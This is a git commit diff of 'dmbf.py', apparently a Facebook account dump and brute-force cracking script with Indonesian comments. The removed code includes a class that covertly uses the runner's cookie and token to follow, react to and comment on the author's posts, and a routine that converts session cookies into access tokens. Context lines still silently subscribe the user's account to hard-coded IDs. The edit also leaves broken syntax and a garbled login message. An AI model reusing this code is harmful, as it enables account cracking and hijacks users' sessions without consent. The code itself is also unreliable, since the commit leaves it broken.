261f9ce320bff69f575e17772968131cca6a28ef
Syafii-XD <101574975+Syafii-XD@users.noreply.github.com>
2022-05-19 20:14:50 +0700

    update dmbf.py

--- dmbf.py
+++ dmbf.py
@@ -1,16 +1,6 @@
 #!/usr/bin/python
 # coding=utf-8
-# ------ [ Gausah Dioprek Ntar Error ] ------ #
-Author    = 'Mhd Syafii'
-Facebook  = 'Facebook.com/fikritampan305'
-Instagram = 'Instagram.com/fi_sinaga'
-Whatsapp  = '081269496231'
-YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
-Version   = '2.0'
-Syafii  = 100080716718035
-Postingan = 115753054458585
-komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
-##### >>>> IMPORT MODULE
+# ------ [ Gausah Dioprek Ntar Error ] ------ ODULE
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
 from random import randint
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
@@ -104,73 +94,7 @@ def resik():
         except:pass
 
 ### BUAT ANIMASI JALAN
-def jalan(z):
-	for e in z + "\n":
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(0.03)
-		
-###----------[ GLOBAL URL & HEADERS ]---------- ###
-url_businness = "https://business.facebook.com"
-ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
-kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
-web_fb = "https://www.facebook.com/"
-m_fb = "https://m.facebook.com/"
-mbasic = "https://mbasic.facebook.com/"
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
-
-###----------[ CREATE FOLDER ]---------- ###
-def mkdir_data_login():
-    # Make Directory Login Data
-    try:os.mkdir("login")
-    except:pass
-    # Make Directory Dump
-    try:os.mkdir("dump")
-    except:pass
-    # Make Directory Pass
-    try:os.mkdir("tool")
-    except:pass
-    # Make Directory Result
-    try:os.mkdir("CP")
-    except:pass
-    # Make Directory Result
-    try:os.mkdir("OK")
-    except:pass
-    # Delete Cookies
-    try:os.remove('login/cookie.json')
-    except:pass
-    # Delete Token
-    try:os.remove('login/token.json')
-    except:pass
-###----------[ CHANGE LANGUAGE ]---------- ###
-def language(cookie):
-    try:
-        with requests.Session() as xyz:
-            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
-            pra = par(req.content,'html.parser')
-            for x in pra.find_all('form',{'method':'post'}):
-                if 'Bahasa Indonesia' in str(x):
-                    bahasa = {
-                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
-                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
-                        "submit"  : "Bahasa Indonesia"
-                        }
-                    url = 'https://mbasic.facebook.com' + x['action']
-                    exec = xyz.post(url,data=bahasa,cookies=cookie)
-    except Exception as e:pass
-
-###----------[ CONVERT USERNAME KE ID ]---------- ###
-def convert_id(username):
-    try:
-        cookie = {'cookie':open('login/cookie.json','r').read()}
-        url    = 'https://mbasic.facebook.com/' + username
-        with requests.Session() as xyz:
-            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
-            kut = req.find('a',string='Lainnya')
-            id = str(kut['href']).split('=')[1]
-            # id = re.search('owner_id=(.*?)"',str(kut)).group(1)
-            return(id)
-    except Exception as e:return(username)
+)
     
 ###----------[ EXCEPTION ]---------- ###
 def kecuali(error):
@@ -183,63 +107,7 @@ def kecuali(error):
     print(f"{P}[04] Bug Pada Requests")
     print(f"{P}[05] Dan Lain-Lain")
     print(f"{P}[•] Jalankan Ulang Source Code Ini : ")
-    print(f"{P}[•] python yuki.py")
-    exit()
-
-###----------[BOT AUTHOR JANGAN DIGANTI ]---------- ###
-class bot_author:
-    def __init__(self,cookie,token,cookie_mentah):
-        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Syafii)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
-        for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
-    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
-        with requests.Session() as xyz:
-            try:
-                    for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
-                        if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
-            except Exception as e:pass
-    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
-        with requests.Session() as xyz:
-            try:
-                    bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
-                    for x in bos.find_all('a',href=True):
-                        if 'Tanggapi' in x.text:
-                            _react_type_ = random.choice(['Super','Wow','Peduli'])
-                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie).content,'html.parser').find_all('a'):
-                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
-                                else:continue
-                    self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
-            except Exception as e:pass
-    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
-        with requests.Session() as xyz:
-            try:
-                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
-                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
-                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
-                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(___fii___Sayang___Kamu___Widiya___())
-            except Exception as e:pass
-    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
-        _bulan_ = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
-        _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
-        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
-        jam      = datetime.now().strftime("%X")
-        tem      = ('\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
-        return(tem)
-
-###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
-def clotox(cookie):
-    with requests.Session() as xyz:
-        get_tok = xyz.get(url_businness+'/business_locations',headers = {
-            "user-agent":ua_business,
-            "referer": web_fb,
-            "host": "business.facebook.com",
-            "origin": url_businness,
-            "upgrade-insecure-requests" : "1",
-            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-            "cache-control": "max-age=0",
-            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
-        return (re.search("(EAAG\w+)", get_tok.text).group(1))
-        
+    
 ##### LOGIN TOKEN
 def log_cookie():
     resik()
@@ -269,7 +137,7 @@ def ___fii___Sayang___Kamu___Widiya___():
     requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(toket),cookies=cookie)
     requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(toket),cookies=cookie)
     requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(toket),cookies=cookie)
-    print(f"{K}[•]Login Berhasil.")
+    print(f"{K}[•]MampUSS eerrrokkrrrkan.")
     menu()
 	
 ###### BUAT MENU
